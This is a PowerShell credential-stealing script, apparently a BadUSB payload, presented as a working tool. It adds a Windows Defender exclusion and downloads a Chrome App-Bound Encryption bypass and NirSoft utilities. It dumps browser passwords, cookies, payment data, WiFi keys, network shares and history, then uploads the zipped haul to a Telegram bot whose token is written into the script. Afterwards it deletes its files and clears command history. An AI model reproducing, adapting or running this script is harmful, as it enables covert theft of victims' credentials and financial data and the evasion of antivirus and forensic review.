#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | | |_|_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                           
#
# UPDATED: Bypasses Chrome 127+ App-Bound Encryption
# Uses chromelevator (xaitax) for ABE-aware credential extraction

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"
$chromeOutput = "$dumpFolder\chromium_data"

# Create directory structure
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# ------------------------------------------------------------
# TOOL DOWNLOADS
# ------------------------------------------------------------

# 1. ABE-aware Chrome/Edge/Brave dumper (replaces WebBrowserPassView)
Write-Host "[*] Downloading Chrome App-Bound Encryption bypass tool..."
Invoke-WebRequest -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip" `
    -OutFile "chrome_injector.zip"

# 2. Legacy tools (still useful for Firefox, IE, WiFi, Network shares)
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true" `
    -OutFile "WirelessKeyView.exe"
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true" `
    -OutFile "WNetWatcher.exe"
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true" `
    -OutFile "BrowsingHistoryView.exe"

# ------------------------------------------------------------
# EXTRACT CHROMELEVATOR
# ------------------------------------------------------------
Expand-Archive -Path "chrome_injector.zip" -DestinationPath "chromelevator" -Force

# ------------------------------------------------------------
# DATA COLLECTION
# ------------------------------------------------------------

# 1. CHROMIUM BROWSERS (Chrome 127+ ABE-aware extraction)
#    Extracts: passwords, cookies, payment methods, IBANs, auth tokens
Write-Host "[*] Extracting Chromium browser data (ABE bypass)..."

# Need to run from the browser directory for path validation - 
# but chromelevator uses process hollowing so we just use --kill to 
# terminate existing browser processes first
.\chromelevator\chromelevator.exe all --kill --output-path "$chromeOutput" 2>&1 | Out-Null

# If chromelevator fails due to path validation, try from Chrome's directory
if (-not (Test-Path "$chromeOutput\Chrome\Default\passwords.json") -and 
    -not (Test-Path "$chromeOutput\Edge\Default\passwords.json")) {
    
    Write-Host "[*] Trying per-browser directory execution..."
    
    # Chrome
    $chromePath = "$env:ProgramFiles\Google\Chrome\Application"
    if (Test-Path $chromePath) {
        Copy-Item ".\chromelevator\chromelevator.exe" "$chromePath\" -Force
        Push-Location $chromePath
        .\chromelevator.exe chrome --output-path "$chromeOutput" 2>&1 | Out-Null
        Pop-Location
    }
    
    # Edge
    $edgePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application"
    if (Test-Path $edgePath) {
        Copy-Item ".\chromelevator\chromelevator.exe" "$edgePath\" -Force
        Push-Location $edgePath
        .\chromelevator.exe edge --output-path "$chromeOutput" 2>&1 | Out-Null
        Pop-Location
    }
}

# 2. WIFI PASSWORDS (legacy - still works, not Chrome-dependent)
Write-Host "[*] Extracting WiFi passwords..."
.\WirelessKeyView.exe /stext wifi.txt

# 3. NETWORK SHARES
Write-Host "[*] Extracting network connections..."
.\WNetWatcher.exe /stext connected_devices.txt

# 4. BROWSING HISTORY (Firefox, IE, legacy browsers)
Write-Host "[*] Extracting browsing history..."
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt

# ------------------------------------------------------------
# COLLECT & PACKAGE
# ------------------------------------------------------------

# Wait for files to exist
$legacyFiles = @("wifi.txt", "connected_devices.txt", "history.txt")
$timeout = 30
$waited = 0
while ($waited -lt $timeout) {
    $allExist = $true
    foreach ($f in $legacyFiles) {
        if (-not (Test-Path $f)) { $allExist = $false; break }
    }
    if ($allExist) { break }
    Start-Sleep -Seconds 1
    $waited++
}

# Move legacy tool outputs
Move-Item -Path wifi.txt, connected_devices.txt, history.txt `
    -Destination "$dumpFolder" -ErrorAction SilentlyContinue

# Copy chromelevator output
if (Test-Path $chromeOutput) {
    Copy-Item -Path "$chromeOutput\*" -Destination "$dumpFolder" -Recurse -Force
}

# Compress everything
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait for ZIP
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# ------------------------------------------------------------
# EXFILTRATE VIA TELEGRAM
# ------------------------------------------------------------
$token = "8981154010:AAHQoIVUkCdLbdtFyh6s3467kU5XVWdMF58"
$chatID = "6337521340"
$uri = "https://api.telegram.org/bot$token/sendDocument"
$caption = "Exfiltrated data from $env:USERNAME | Chrome ABE-bypassed passwords+cookies"

if (!(Test-Path $dumpFile)) { exit 1 }

# Ensure System.Net.Http is available
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse `
        -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

# Create HTTP client & send
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

$filename = [System.IO.Path]::GetFileName("$dumpFile")
$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "document", $filename)

try { $client.PostAsync($uri, $content).Wait() } catch {}

# Cleanup
$fileStream.Close()
$fileStream.Dispose()
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit
